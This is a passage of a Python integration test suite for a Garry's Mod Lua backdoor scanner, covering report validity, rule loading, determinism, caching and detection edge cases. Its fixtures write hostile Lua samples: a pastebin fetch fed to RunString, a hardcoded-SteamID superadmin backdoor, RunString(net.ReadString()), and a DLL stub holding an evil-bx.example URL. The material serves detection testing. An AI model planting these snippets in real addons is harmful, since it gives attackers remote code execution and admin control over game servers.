        # The HTML report is the part a person actually reads, and no test had
        # ever parsed it: every suite treated it as text and looked for
        # substrings. That is how an unclosed <div class='stats'> shipped.
        void_tags = {"area", "base", "br", "col", "embed", "hr", "img", "input",
                     "link", "meta", "param", "source", "track", "wbr"}

        class Markup(HTMLParser):
            def __init__(self):
                super().__init__(convert_charrefs=True)
                self.open_tags = []
                self.problems = []

            def handle_starttag(self, tag, attrs):
                if tag not in void_tags:
                    self.open_tags.append(tag)

            def handle_endtag(self, tag):
                if tag in void_tags:
                    self.problems.append("</%s> closes a void element" % tag)
                elif tag not in self.open_tags:
                    self.problems.append("</%s> closes nothing" % tag)
                elif self.open_tags[-1] != tag:
                    self.problems.append("</%s> while <%s> is open" % (tag, self.open_tags[-1]))
                    while self.open_tags.pop() != tag:
                        pass
                else:
                    self.open_tags.pop()

        def markup_is_sound(report, name):
            parser = Markup()
            parser.feed(report.read_text(encoding="utf-8"))
            parser.close()
            assert not parser.problems, "%s: %s" % (name, parser.problems[:3])
            assert not parser.open_tags, "%s: never closed %s" % (name, parser.open_tags)

        # SARIF is read by a machine that silently drops what it cannot use, and
        # from here a rejected file looks exactly like an accepted one. These are
        # the parts of the shape the spec requires and the tests never checked.
        def sarif_is_sound(report, name):
            doc = json.loads(report.read_text(encoding="utf-8"))
            assert doc.get("version") == "2.1.0", "%s: version %r" % (name, doc.get("version"))
            assert doc.get("$schema"), "%s: no $schema" % name
            assert doc.get("runs"), "%s: no runs" % name
            for block in doc["runs"]:
                driver = block["tool"]["driver"]
                assert driver.get("name"), "%s: driver has no name" % name
                assert driver.get("informationUri"), "%s: driver has no informationUri" % name
                declared = [rule["id"] for rule in driver.get("rules", [])]
                assert len(declared) == len(set(declared)), "%s: duplicate rule ids" % name
                for rule in driver.get("rules", []):
                    assert rule.get("id"), "%s: rule without an id" % name
                    assert rule.get("shortDescription", {}).get("text"), (
                        "%s: rule %s has no shortDescription" % (name, rule["id"]))
                    assert rule.get("defaultConfiguration", {}).get("level") in (
                        "none", "note", "warning", "error"), (
                        "%s: rule %s has level %r" % (name, rule["id"],
                                                      rule.get("defaultConfiguration")))
                used = set()
                for result in block.get("results", []):
                    rule_id = result.get("ruleId")
                    assert rule_id in declared, (
                        "%s: result names %r, which the driver does not declare" % (name, rule_id))
                    used.add(rule_id)
                    if "ruleIndex" in result:
                        assert declared[result["ruleIndex"]] == rule_id, (
                            "%s: ruleIndex %d is %s, not %s"
                            % (name, result["ruleIndex"], declared[result["ruleIndex"]], rule_id))
                    assert result.get("message", {}).get("text"), (
                        "%s: %s has no message" % (name, rule_id))
                    assert result.get("level") in ("none", "note", "warning", "error"), (
                        "%s: %s has level %r" % (name, rule_id, result.get("level")))
                    locations = result.get("locations")
                    assert locations, "%s: %s has no location" % (name, rule_id)
                    for location in locations:
                        physical = location["physicalLocation"]
                        uri = physical["artifactLocation"]["uri"]
                        assert uri, "%s: %s has an empty uri" % (name, rule_id)
                        assert all(ord(c) < 128 for c in uri), "%s: non-ascii uri %r" % (name, uri)
                        region = physical.get("region")
                        if region is not None:
                            assert region.get("startLine", 0) >= 1, (
                                "%s: %s startLine %r" % (name, rule_id, region.get("startLine")))
                assert used == set(declared), (
                    "%s: the driver declares rules no result uses: %s"
                    % (name, sorted(set(declared) - used)))

        # Both report caps have to hold: a hundred files in detail, twenty
        # findings per file. The truncation branch is where the unclosed div was.
        heavy = work / "heavy"
        heavy.mkdir()
        staged = ('http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)'
                  + chr(10))
        for index in range(120):
            (heavy / ("mod%03d.lua" % index)).write_text(staged, encoding="utf-8")
        (heavy / "busy.lua").write_text(staged * 40, encoding="utf-8")

        boxed = work / "boxed-report"
        boxed.mkdir()
        (boxed / "addon.gma").write_bytes(gma([
            ("lua/autorun/server/hidden.lua",
             b'http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b) RunString(b) end)\n'),
            ("materials/skin.vmt", b'"UnlitGeneric" { "$basetexture" "x" }\n')]))

        # A report shows lines an attacker wrote. Markup in them may not become
        # markup in the page, and must not unbalance it either.
        smuggled = work / "smuggled"
        smuggled.mkdir()
        (smuggled / "markup.lua").write_text(
            'RunString("</div></body></html><script>alert(1)</script>")' + chr(10)
            + 'RunString("<div><span>' + "<b>" * 40 + '")' + chr(10), encoding="utf-8")

        for name, target in (("report-graded", graded), ("report-heavy", heavy),
                             ("report-boxed", boxed), ("report-smuggled", smuggled)):
            run(target, name, ["--html", "--sarif"])
            written = work / "output" / name
            markup_is_sound(written / "scan_report.html", name)
            sarif_is_sound(written / "scan_results.sarif", name)
            checks += 1

        capped = (work / "output" / "report-heavy" / "scan_report.html").read_text(encoding="utf-8")
        assert "further files with findings" in capped, "the file cap stopped saying it capped"
        assert "further findings in this file" in capped, "the per-file cap stopped saying it capped"
        checks += 1

        # Reports are written to a temporary file and renamed over the target, so
        # a failed write leaves the previous report in place. Nothing had ever
        # made the write fail. A directory in the way is the portable way to do
        # it: Windows ignores a read-only bit on a folder.
        blocked = work / "blocked"
        blocked.mkdir()
        (blocked / "bad.lua").write_text("RunString(net.ReadString())" + chr(10), encoding="utf-8")
        for occupied, extra, said in (("scan_log.json", [], "scan_log.json"),
                                      ("scan_report.html", ["--html"], "HTML report"),
                                      ("scan_results.sarif", ["--sarif"], "scan_results.sarif")):
            where = work / "output" / ("blocked-" + occupied)
            where.mkdir(parents=True)
            (where / occupied).mkdir()
            refused = subprocess.run(
                [str(scanner), "-d", str(blocked), "-o", str(where), "--rules", str(rules), "-q",
                 *extra],
                cwd=work, capture_output=True, text=True, timeout=60)
            assert refused.returncode == 2, (
                "%s: exit %d%s%s" % (occupied, refused.returncode, refused.stdout, refused.stderr))
            assert said in (refused.stdout + refused.stderr), (
                "%s: the error does not name what failed: %s" % (occupied, refused.stderr))
            leftovers = [path.name for path in where.iterdir() if ".tmp." in path.name]
            assert not leftovers, "%s: left a temporary file behind: %s" % (occupied, leftovers)
            checks += 1

        # Every test up to here passes --rules. The path a real user takes is the
        # one nothing exercised: the binary next to its rule files, or the rule
        # files in the working directory.
        rule_files = ["lua_patterns.txt", "binary_patterns.txt", "data_patterns.txt",
                      "module_patterns.txt", "composite_rules.txt", "whitelist.txt",
                      "known_hashes.txt"]
        found_here = work / "sample-for-resolution"
        found_here.mkdir()
        (found_here / "bad.lua").write_text("RunString(net.ReadString())" + chr(10),
                                            encoding="utf-8")

        beside = work / "beside"
        beside.mkdir()
        shutil.copy(scanner, beside / scanner.name)
        for name in rule_files:
            if (rules / name).is_file():
                shutil.copy(rules / name, beside / name)

        ruleless = work / "ruleless"
        ruleless.mkdir()
        shutil.copy(scanner, ruleless / scanner.name)
        working = work / "rules-in-cwd"
        working.mkdir()
        for name in rule_files:
            if (rules / name).is_file():
                shutil.copy(rules / name, working / name)

        def without_rules(binary, cwd, name):
            return subprocess.run(
                [str(binary), "-d", str(found_here), "-o", str(work / "output" / name), "-q"],
                cwd=str(cwd), capture_output=True, text=True, timeout=60)

        beside_run = without_rules(beside / scanner.name, work, "resolve-beside")
        assert beside_run.returncode == 1, (
            "rules next to the executable were not found: exit %d%s%s"
            % (beside_run.returncode, beside_run.stdout, beside_run.stderr))
        checks += 1

        cwd_run = without_rules(ruleless / scanner.name, working, "resolve-cwd")
        assert cwd_run.returncode == 1, (
            "rules in the working directory were not found: exit %d%s%s"
            % (cwd_run.returncode, cwd_run.stdout, cwd_run.stderr))
        checks += 1

        # An explicit --rules may never quietly fall back somewhere else. The
        # working directory here holds a complete, valid set, so a fallback would
        # look like success.
        empty_rules = work / "empty-rules"
        empty_rules.mkdir()
        for name, directory in (("resolve-no-fallback-empty", empty_rules),
                                ("resolve-no-fallback-partial", work / "partial-rules")):
            if directory != empty_rules:
                directory.mkdir()
                shutil.copy(rules / "lua_patterns.txt", directory / "lua_patterns.txt")
            refused = subprocess.run(
                [str(ruleless / scanner.name), "-d", str(found_here), "-o", str(work / "output" / name),
                 "--rules", str(directory), "-q"],
                cwd=str(working), capture_output=True, text=True, timeout=60)
            assert refused.returncode == 2, (
                "%s: --rules fell back to another directory, exit %d%s%s"
                % (name, refused.returncode, refused.stdout, refused.stderr))
            checks += 1

        # Which rule files are required is a promise the README makes, and it was
        # wrong: module_patterns.txt is required too. Take each one away in turn.
        required = ["lua_patterns.txt", "binary_patterns.txt", "data_patterns.txt",
                    "module_patterns.txt"]
        for missing in required:
            incomplete = work / ("without-" + missing)
            incomplete.mkdir()
            for name in rule_files:
                if name != missing and (rules / name).is_file():
                    shutil.copy(rules / name, incomplete / name)
            refused = subprocess.run(
                [str(scanner), "-d", str(found_here), "-o", str(work / "output" / incomplete.name),
                 "--rules", str(incomplete), "-q"],
                cwd=work, capture_output=True, text=True, timeout=60)
            assert refused.returncode == 2, (
                "a rule set without %s started anyway: exit %d" % (missing, refused.returncode))
            assert missing in (refused.stdout + refused.stderr), (
                "%s: the error does not name the missing file: %s" % (missing, refused.stderr))
            checks += 1

        # Files are handed out to whatever number of threads the machine offers,
        # so the answer must not depend on that number. Nothing could test this
        # before, because the count came from hardware_concurrency alone.
        def with_threads(count, name):
            environment = dict(os.environ, BDSCAN_THREADS=str(count))
            done = subprocess.run(
                [str(scanner), "-d", str(heavy), "-o", str(work / "output" / name),
                 "--rules", str(rules), "-q"],
                cwd=work, capture_output=True, text=True, timeout=180, env=environment)
            assert done.returncode == 1, "%s: exit %d%s" % (name, done.returncode, done.stderr)
            report = json.loads(
                (work / "output" / name / "scan_log.json").read_text(encoding="utf-8"))
            return sorted((item["id"], item["file"], item["line_number"])
                          for item in report["detections"]), report

        single, single_report = with_threads(1, "threads-1")
        many, many_report = with_threads(16, "threads-16")
        assert single == many, (
            "thread count changed the findings: %d with one thread, %d with sixteen"
            % (len(single), len(many)))
        assert single_report["files_processed"] == many_report["files_processed"], (
            "thread count changed how many files were read")
        assert single, "the determinism check scanned nothing"
        checks += 1

        # Every malformed-archive case so far is a file that fails before it is
        # decompressed. This is the other order: a sound LZMA stream carrying
        # something that is not an archive, which only the reader can tell.
        for name, plain in (("unpacked-too-small", b"GM"),
                            ("unpacked-bad-magic", b"NOPE" + b"\0" * 60)):
            folder = work / name
            folder.mkdir()
            (folder / "addon.gma").write_bytes(
                lzma.compress(plain, format=lzma.FORMAT_ALONE, preset=6))
            carried = run(folder, name, expected=3)
            listed = carried["unscanned"]["files"]
            assert listed and listed[0]["reason"] == "malformed_archive", listed
            assert "not a GMA" in listed[0]["detail"], listed[0]["detail"]
            checks += 1

        # Colour is decided by asking whether stdout is a terminal, and no test
        # had ever given it one: every run here captures output through a pipe,
        # and `--color always` answers before the question is asked.
        def through_a_terminal(name, environment):
            controller, follower = os.openpty()
            watching = subprocess.Popen(
                [str(scanner), "-d", str(blocked), "-o", str(work / "output" / name),
                 "--rules", str(rules)],
                stdin=subprocess.DEVNULL, stdout=follower, stderr=subprocess.STDOUT,
                cwd=str(work), env=environment)
            os.close(follower)
            pieces = []
            while True:
                try:
                    piece = os.read(controller, 65536)
                except OSError:
                    break
                if not piece:
                    break
                pieces.append(piece)
            os.close(controller)
            assert watching.wait(timeout=60) == 1, "%s exited %d" % (name, watching.returncode)
            return b"".join(pieces).decode("utf-8", "replace")

        if hasattr(os, "openpty"):
            plain = dict(os.environ, TERM="xterm-256color")
            plain.pop("NO_COLOR", None)
            assert chr(27) + "[" in through_a_terminal("colour-tty", plain), (
                "stdout was a terminal and nothing was coloured")
            checks += 1

            for name, change in (("colour-dumb", {"TERM": "dumb"}),
                                 ("colour-no-color", {"NO_COLOR": "1"})):
                muted = dict(plain, **change)
                assert chr(27) + "[" not in through_a_terminal(name, muted), (
                    "%s: colour survived %s" % (name, change))
                checks += 1
        else:
            print("integration: terminal colour checks skipped, no pty on this platform")

        # Lua reads f"x" and f[[x]] as f("x"), so the scanner rewrites them into
        # that shape before any rule sees the file. Fifteen rules -- require,
        # AddCSLuaFile, timer.Remove and the rest -- were only ever taught the
        # parenthesised spelling, and none of them was ever told otherwise, so
        # what has to hold is that both spellings produce the same finding.
        spellings = [
            ('require("ffi")', 'require"ffi"', "require[[ffi]]"),
            ('AddCSLuaFile("data/payload.lua")', 'AddCSLuaFile"data/payload.lua"',
             "AddCSLuaFile[[data/payload.lua]]"),
            ('timer.Remove("AntiCheatScan")', 'timer.Remove"AntiCheatScan"',
             "timer.Remove[[AntiCheatScan]]"),
            ('concommand.Remove("rp_resetallmoney")', 'concommand.Remove"rp_resetallmoney"',
             "concommand.Remove[[rp_resetallmoney]]"),
            ('ents.Create("env_explosion")', 'ents.Create"env_explosion"',
             "ents.Create[[env_explosion]]"),
        ]
        for index, forms in enumerate(spellings):
            answers = []
            for shape, source in enumerate(forms):
                folder = work / ("call-form-%d-%d" % (index, shape))
                folder.mkdir()
                (folder / "a.lua").write_text(source + chr(10), encoding="utf-8")
                answers.append(ids(run(folder, "call-form-%d-%d" % (index, shape))))
            assert answers[0] == answers[1] == answers[2], (
                "the same call written three ways gave three answers: %s -> %s"
                % (list(forms), answers))
            assert answers[0], "%s produced no finding at all" % forms[0]
            checks += 1

        # A blank line after a finding is not the end of the file, and the report
        # is meant to be judged without opening the source.
        spaced = work / "context-blank"
        spaced.mkdir()
        (spaced / "a.lua").write_text(
            "local a = 1" + chr(10) + "local b = 2" + chr(10) + "local c = 3" + chr(10)
            + "RunString(net.ReadString())" + chr(10) + chr(10) + "local e = 5" + chr(10)
            + "local f = 6" + chr(10), encoding="utf-8")
        hit = next(d for d in run(spaced, "context-blank")["detections"] if d["id"] == "LUA-001")
        lines = hit.get("context", {}).get("lines", [])
        assert len(lines) == 7, (
            "a blank line cut the context short: %d lines, %s" % (len(lines), lines))
        assert lines[-1].strip() == "local f = 6", lines
        checks += 1

        # Folding joins two pieces per pass, so a name split into more pieces than
        # the pass budget allows was never reassembled and the finding was lost.
        for pieces in (16, 17, 40):
            parts = ['"R"', '"u"', '"n"', '"S"', '"t"', '"r"', '"i"', '"n"', '"g"']
            parts += ['""'] * max(0, pieces - len(parts))
            split = work / ("fold-%d" % pieces)
            split.mkdir()
            (split / "a.lua").write_text(
                "local f = _G[" + "..".join(parts) + "]" + chr(10)
                + 'f("print(1)")' + chr(10), encoding="utf-8")
            found = ids(run(split, "fold-%d" % pieces))
            assert "LUA-028" in found, (
                "a name split into %d pieces was not folded back: %s" % (pieces, found))
            checks += 1

        # The per-file cap in the HTML report kept the first twenty findings
        # after sorting by severity and line, so a file with twenty-five hits of
        # one rule and three other rules showed only the first rule. The page is
        # what a server owner reads; a rule type missing from it is invisible.
        crowd = work / "html-rule-coverage"
        crowd.mkdir()
        (crowd / "mix.lua").write_text(
            "".join('RunString("x%d")%s' % (n, chr(10)) for n in range(25))
            + "getfenv(1)" + chr(10) + "setfenv(1,{})" + chr(10)
            + "debug.sethook(f)" + chr(10), encoding="utf-8")
        data = run(crowd, "html-rule-coverage", ["--html"])
        page = (work / "output" / "html-rule-coverage" / "scan_report.html").read_text(
            encoding="utf-8")
        missing = [rule for rule in ids(data) if rule not in page]
        assert not missing, "rule types reported in the JSON but absent from the page: %s" % missing
        assert "of lower severity" not in page
        markup_is_sound(work / "output" / "html-rule-coverage" / "scan_report.html",
                        "html-rule-coverage")
        checks += 1

        # Invisible characters are two different things. The marks that reorder
        # text are the attack; the marks that set direction and join letters are
        # what every Arabic, Hebrew and Persian translation is made of.
        bidi = work / "bidi"
        bidi.mkdir()
        (bidi / "lang_ar.lua").write_text(
            "".join('L["k%d"] = "%s%s %s%%s%s"%s'
                    % (n, chr(0x200F), chr(0x645) + chr(0x631) + chr(0x62D) + chr(0x628),
                       chr(0x200E), chr(0x200F), chr(10))
                    for n in range(6)), encoding="utf-8")
        (bidi / "attack.lua").write_text(
            "".join("local %sname%d = %d%s" % (chr(0x202A) * 3, n, n, chr(10))
                    for n in range(10)), encoding="utf-8")
        found = run(bidi, "bidi")
        by_file = {}
        for item in found["detections"]:
            by_file.setdefault(item["file"].split("/")[-1], set()).add(item["id"])
        assert "OBF-006" in by_file.get("attack.lua", set()), (
            "reordering marks in identifiers are no longer reported: %s" % by_file)
        assert "OBF-006" not in by_file.get("lang_ar.lua", set()), (
            "a translation file is reported for the marks that make it readable: %s" % by_file)
        checks += 1

        # A file can only be counted once, and a hash can only match once.
        counted = work / "counted"
        (counted / "a").mkdir(parents=True)
        (counted / "b").mkdir(parents=True)
        twin = "RunString(net.ReadString())" + chr(10)
        for side in ("a", "b"):
            (counted / side / "m.lua").write_bytes(twin.encode("utf-8"))
        twin_hash = hashlib.sha256((counted / "a" / "m.lua").read_bytes()).hexdigest()
        hash_rules = work / "hash-count-rules"
        hash_rules.mkdir()
        for name in rule_files:
            if (rules / name).is_file() and name != "known_hashes.txt":
                shutil.copy(rules / name, hash_rules / name)
        (hash_rules / "known_hashes.txt").write_text(twin_hash + chr(10), encoding="utf-8")
        spoken = subprocess.run(
            [str(scanner), "-d", str(counted), "-o", str(work / "output" / "counted"),
             "--rules", str(hash_rules), "--color", "never"],
            cwd=work, capture_output=True, text=True, timeout=120,
            encoding="utf-8", errors="replace")
        said = spoken.stdout + spoken.stderr
        assert "2 of 1 listed hashes" not in said, (
            "the known-backdoor line counts detections, not hashes: %s"
            % [l for l in said.splitlines() if "listed hashes" in l])
        assert "1 of 1 listed hashes" in said, (
            "one listed hash matched twice should read as one: %s"
            % [l for l in said.splitlines() if "listed hashes" in l])
        tally = json.loads(
            (work / "output" / "counted" / "scan_log.json").read_text(encoding="utf-8"))
        for line in said.splitlines():
            if "findings in" in line and " of " in line:
                shown = int(line.split("findings in")[1].split("of")[0].strip())
                assert shown <= tally["files_processed"], (
                    "more files reported than were examined: %s" % line.strip())
        checks += 1

        # --accept takes a rule or a hash, and a path to scope it to. For the
        # hash form the path was parsed, validated and then dropped, so a
        # reviewer who exempted one copy of a stock file exempted every copy of
        # it anywhere, which is exactly what the pinned whitelist form exists to
        # prevent.
        scoped = work / "accept-scoped"
        (scoped / "addons" / "stock").mkdir(parents=True)
        (scoped / "addons" / "evil").mkdir(parents=True)
        body = "RunString(net.ReadString())" + chr(10)
        for where in ("stock", "evil"):
            (scoped / "addons" / where / "run.lua").write_bytes(body.encode("utf-8"))
        digest = hashlib.sha256(
            (scoped / "addons" / "stock" / "run.lua").read_bytes()).hexdigest()

        scoped_rules = work / "accept-scoped-rules"
        scoped_rules.mkdir()
        for name in rule_files:
            if (rules / name).is_file() and name != "whitelist.txt":
                shutil.copy(rules / name, scoped_rules / name)
        (scoped_rules / "whitelist.txt").write_text("", encoding="utf-8")

        recorded = subprocess.run(
            [str(scanner), "--rules", str(scoped_rules),
             "--accept", "%s@*/addons/stock/*" % digest, "--reason", "stock file, that path only"],
            cwd=work, capture_output=True, text=True, timeout=60,
            encoding="utf-8", errors="replace")
        assert recorded.returncode == 0, recorded.stdout + recorded.stderr
        written = (scoped_rules / "whitelist.txt").read_text(encoding="utf-8")
        assert "*/addons/stock/*;;;" + digest in written, (
            "--accept dropped the path it was given: %r" % written)
        checks += 1

        after = run(scoped, "accept-scoped-scan", rule_dir=scoped_rules)
        exempted = [d for d in after["detections"] if "stock" in d["file"]]
        still_seen = [d for d in after["detections"] if "evil" in d["file"]]
        assert not exempted, "the exempted path still reports: %s" % exempted[:1]
        assert still_seen, "the exemption silenced a copy it was not scoped to"
        checks += 1

        # The same option has to find the rules the same way a scan does. It
        # looked only next to the executable, so it failed where a scan worked.
        accept_cwd = subprocess.run(
            [str(ruleless / scanner.name), "--accept", "LUA-001@*/x/*", "--reason", "fine"],
            cwd=str(working), capture_output=True, text=True, timeout=60,
            encoding="utf-8", errors="replace")
        assert accept_cwd.returncode == 0, (
            "--accept could not find the rules a scan finds: %s"
            % (accept_cwd.stdout + accept_cwd.stderr))
        assert "*/x/*;;;LUA-001" in (working / "whitelist.txt").read_text(encoding="utf-8")
        checks += 1

        # A glob is written into whitelist.txt verbatim. Folding it to ASCII
        # turned every non-English character into '?', which is a glob wildcard,
        # so the entry matched more paths than the reviewer named.
        accented = subprocess.run(
            [str(scanner), "--rules", str(scoped_rules),
             "--accept", "LUA-001@*/m" + chr(0xFC) + "nzen/*", "--reason", "gepr" + chr(0xFC) + "ft"],
            cwd=work, capture_output=True, text=True, timeout=60,
            encoding="utf-8", errors="replace")
        assert accented.returncode == 0, accented.stdout + accented.stderr
        kept = (scoped_rules / "whitelist.txt").read_text(encoding="utf-8")
        assert "m" + chr(0xFC) + "nzen" in kept, (
            "a non-ASCII path was transliterated into wildcards: %r" % kept.splitlines()[-1])
        checks += 1

        # Tags are written with a space after the comma as often as not.
        tagged = work / "tagged"
        tagged.mkdir()
        (tagged / "x.lua").write_text(
            body + 'local blob = "' + "QUJD" * 25 + '"' + chr(10), encoding="utf-8")
        spaced_tags = ids(run(tagged, "tags-spaced", ["--exclude-tags", "execution, obfuscation"],
                              expected=0))
        tight_tags = ids(run(tagged, "tags-tight", ["--exclude-tags", "execution,obfuscation"],
                             expected=0))
        assert spaced_tags == tight_tags, (
            "a space after the comma changed which tags were excluded: %s vs %s"
            % (spaced_tags, tight_tags))
        checks += 1

        # atleast() counted its arguments, not the distinct ids among them, so
        # the same id repeated three times let one detection satisfy a threshold
        # of three. A copy/paste slip in a long id list is now refused at load.
        dup_rules = work / "dup-atleast-rules"
        dup_rules.mkdir()
        for name in rule_files:
            if (rules / name).is_file() and name != "composite_rules.txt":
                shutil.copy(rules / name, dup_rules / name)
        (dup_rules / "composite_rules.txt").write_text(
            "atleast(3, LUA-050, LUA-050, LUA-050);;;[HIGH] COMP-900 Duplicated;;;hint" + chr(10),
            encoding="utf-8")
        refused = subprocess.run(
            [str(scanner), "-d", str(tagged), "-o", str(work / "output" / "dup-atleast"),
             "--rules", str(dup_rules), "-q"],
            cwd=work, capture_output=True, text=True, timeout=60,
            encoding="utf-8", errors="replace")
        assert refused.returncode == 2, (
            "atleast(3, X, X, X) loaded: exit %d" % refused.returncode)
        assert "distinct" in (refused.stdout + refused.stderr), (
            "the error does not say what is wrong: %s" % refused.stderr)
        checks += 1

        # Exit 3 exists so that a scan which could not read part of the tree
        # cannot pass as a clean one. A file that a rule gave up on partway is
        # exactly that case, and caching its partial result laundered the whole
        # scan: the cold run said exit 3 and incomplete, the warm run said exit 0
        # and complete.
        gave_up_rules = work / "gave-up-rules"
        gave_up_rules.mkdir()
        for name in rule_files:
            if (rules / name).is_file():
                shutil.copy(rules / name, gave_up_rules / name)
        # The rule below escapes the backtracking check because its branches
        # begin with an escape rather than a literal, and \d is inside \w, so
        # every split of the input is tried. MSVC gives up and throws, which is
        # the pattern_limit state; libstdc++ has no limit and would run for
        # hours, so this only runs where the state is reachable at all.
        with (gave_up_rules / "lua_patterns.txt").open("a", encoding="utf-8") as handle:
            handle.write(r"(?:\w|\d)+#" + ";;;[HIGH] LUA-901 Cannot finish;;;hint" + chr(10))
        gave_up = work / "gave-up"
        gave_up.mkdir()
        (gave_up / "x.lua").write_text("1" * 120 + "!" + chr(10), encoding="utf-8")
        (gave_up / "ok.lua").write_text("local fine = 1" + chr(10), encoding="utf-8")

        partial_cache = work / "partial-cache.json"
        reachable = True
        try:
            cold = subprocess.run(
                [str(scanner), "-d", str(gave_up), "-o", str(work / "output" / "partial-cold"),
                 "--rules", str(gave_up_rules), "-q", "--cache", str(partial_cache)],
                cwd=work, capture_output=True, text=True, timeout=8,
                encoding="utf-8", errors="replace")
        except subprocess.TimeoutExpired:
            reachable = False

        cold_log = work / "output" / "partial-cold" / "scan_log.json"
        cold_data = json.loads(cold_log.read_text(encoding="utf-8")) if cold_log.is_file() else None
        if not reachable or cold_data is None or cold_data["complete"]:
            print("integration: partial-scan cache check skipped, "
                  "this regex engine does not give up on that rule")
        else:
            assert cold.returncode == 3, "a partly examined file should exit 3, got %d" % cold.returncode
            assert cold_data["unscanned"]["total"] == 1, cold_data["unscanned"]
            warm = run(gave_up, "partial-warm", ["--cache", str(partial_cache)],
                       expected=3, rule_dir=gave_up_rules)
            assert not warm["complete"], (
                "the cache turned an incomplete scan into a complete one")
            assert warm["unscanned"]["total"] == cold_data["unscanned"]["total"], (
                "the warm run reported %d unscanned, the cold run %d"
                % (warm["unscanned"]["total"], cold_data["unscanned"]["total"]))
            checks += 1

        # Recognising a file by its hash used to end the examination of it, so
        # the report said "known backdoor" and nothing about what the backdoor
        # does -- no URL, no SteamID, no hook -- and the combination rules lost
        # an input. Both have to come out.
        known = work / "known-bad"
        (known / "lua" / "autorun").mkdir(parents=True)
        loader = ('http.Fetch("https://pastebin.com/raw/AbCdEf12", function(b)' + chr(10)
                  + "    RunString(b)" + chr(10) + "end)" + chr(10)
                  + 'hook.Add("PlayerInitialSpawn", "x", function(ply)' + chr(10)
                  + '    if ply:SteamID() == "STEAM_0:1:12345678" then'
                  + ' ply:SetUserGroup("superadmin") end' + chr(10) + "end)" + chr(10))
        (known / "lua" / "autorun" / "loader.lua").write_bytes(loader.encode("utf-8"))
        loader_hash = hashlib.sha256(
            (known / "lua" / "autorun" / "loader.lua").read_bytes()).hexdigest()

        listed = work / "known-bad-rules"
        listed.mkdir()
        for name in rule_files:
            if (rules / name).is_file() and name != "known_hashes.txt":
                shutil.copy(rules / name, listed / name)
        (listed / "known_hashes.txt").write_text(loader_hash + chr(10), encoding="utf-8")

        told = ids(run(known, "known-bad", rule_dir=listed))
        assert "HASH-001" in told, "the published hash did not match: %s" % told
        for rule in ("LUA-001", "LUA-010", "LUA-040", "COMP-001"):
            assert rule in told, (
                "recognising the file by hash hid what it does: %s missing from %s"
                % (rule, told))
        checks += 1

        # A cache is only safe to reuse while the scanner that wrote it behaves
        # the same way. The rule fingerprint covers the rule files; nothing
        # covered the binary, so an upgrade that changed what a rule matches
        # replayed the old answer for every unchanged file.
        version_cache = work / "version-cache.json"
        run(tagged, "cache-version-cold", ["--cache", str(version_cache)])
        stored = json.loads(version_cache.read_text(encoding="utf-8"))
        assert stored.get("scanner_version"), "the cache does not record a scanner version"
        stored["scanner_version"] = "0.0.0-old"
        version_cache.write_text(json.dumps(stored), encoding="utf-8")
        again = subprocess.run(
            [str(scanner), "-d", str(tagged), "-o", str(work / "output" / "cache-version-warm"),
             "--rules", str(rules), "--cache", str(version_cache)],
            cwd=work, capture_output=True, text=True, timeout=60,
            encoding="utf-8", errors="replace")
        assert "different scanner" in (again.stdout + again.stderr), (
            "a cache from another build was reused: %s" % again.stdout[-300:])
        checks += 1

        # A native module can carry its strings as UTF-16. Reading big-endian
        # text stopped one character early, which cut the .lua off a URL and took
        # the finding from CRITICAL down to MEDIUM.
        wide_url = "http://evil-bx.example/d.lua"
        wide = work / "wide-strings"
        (wide / "lua" / "bin").mkdir(parents=True)
        (wide / "lua" / "bin" / "gmsv_be_win64.dll").write_bytes(
            b"MZ" + b"\0" * 40
            + b"".join(b"\0" + bytes([ord(c)]) for c in wide_url)
            + b"\xcc" + b"\0" * 32)
        found = ids(run(wide, "wide-strings"))
        assert "MOD-010" in found, (
            "a UTF-16BE url lost its last character: %s" % found)
        checks += 1

        # Windows converts a path to a narrow string through the system code
        # page and throws when a character has no mapping there. One file whose
        # extension the code page cannot spell was enough to end the whole scan
        # with exit 2 and no report at all, so dropping a file called
        # readme.<something> beside a payload hid the payload.
        awkward_names = ["readme." + chr(0x65E5) + chr(0x672C) + chr(0x8A9E),
                         "notes." + chr(0x440) + chr(0x443) + chr(0x441),
                         chr(0xC0C1) + chr(0xC790) + ".lua",
                         "payload" + chr(0x1F4A3) + ".lua"]
        encodings = work / "odd-names"
        encodings.mkdir()
        (encodings / "payload.lua").write_text("RunString(net.ReadString())" + chr(10),
                                               encoding="utf-8")
        written = 0
        for name in awkward_names:
            try:
                (encodings / name).write_text("RunString(net.ReadString())" + chr(10),
                                              encoding="utf-8")
                written += 1
            except (OSError, UnicodeError):
                pass
        if written:
            data = run(encodings, "odd-names")
            assert "LUA-001" in ids(data), (
                "a name outside the system code page hid the payload beside it: %s" % ids(data))
            assert data["complete"], data["unscanned"]
            checks += 1

            # The same for the scan root and the output directory.
            deep_root = encodings / (chr(0x30B9) + chr(0x30AD) + chr(0x30E3) + chr(0x30F3))
            deep_root.mkdir()
            (deep_root / "payload.lua").write_text("RunString(net.ReadString())" + chr(10),
                                                   encoding="utf-8")
            answer = subprocess.run(
                [str(scanner), "-d", str(deep_root),
                 "-o", str(work / "output" / (chr(0x51FA) + chr(0x529B))),
                 "--rules", str(rules), "-q"],
                cwd=work, capture_output=True, text=True, timeout=120,
                encoding="utf-8", errors="replace")
            assert answer.returncode == 1, (
                "a scan root outside the system code page failed: exit %d %s"
                % (answer.returncode, answer.stdout + answer.stderr))
            checks += 1
        else:
            print("integration: code page regression skipped, no such name could be created")

        # A match has to fit inside one scan window, and windows only overlap by
        # 8 KiB, so a rule that could match a whole blob lost it whenever the
        # blob began in the wrong place. The same literal was reported at one
        # offset and not at another, which is a scan result that changes when
        # unrelated code is added above it.
        blob_line = 'local payload = "' + "QUJD" * 2500 + '"' + chr(10)
        tail_line = "RunString(util.Base64Decode(payload))" + chr(10)
        for offset in (16, 20000, 57000, 60000):
            pad = ("-- " + "x" * 76 + chr(10)) * (offset // 80) if offset > 16 else ""
            placed = work / ("window-%d" % offset)
            placed.mkdir()
            (placed / "a.lua").write_text(pad + blob_line + tail_line, encoding="utf-8")
            found = ids(run(placed, "window-%d" % offset))
            assert "LUA-052" in found, (
                "a blob starting near offset %d was not reported: %s" % (offset, sorted(found)))
            assert "COMP-003" in found, (
                "the composite built on it was lost at offset %d: %s" % (offset, sorted(found)))
            checks += 1

        # Bounding those rules may not cost reach: a blob far longer than the
        # bound still has to be reported.
        for size in (100, 9000, 200000):
            huge = work / ("blob-%d" % size)
            huge.mkdir()
            (huge / "a.lua").write_text(
